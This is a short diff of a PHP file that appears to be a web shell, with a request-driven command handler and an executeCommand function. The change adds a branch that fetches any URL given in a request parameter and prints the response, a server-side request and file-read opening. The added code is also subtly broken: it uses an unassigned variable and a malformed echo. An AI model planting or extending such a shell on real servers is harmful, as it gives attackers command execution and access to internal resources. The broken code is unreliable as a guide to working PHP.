@@ -52,6 +52,17 @@ if(isset($_REQUEST[$cmd])) {
 
 }
 
+if (isset($_REQUEST['url'])){
+
+$a = file_get_contents($url);
+echo a;
+exit();
+}
+
+
+
+
+
 die();
 
 function executeCommand(string $command) {
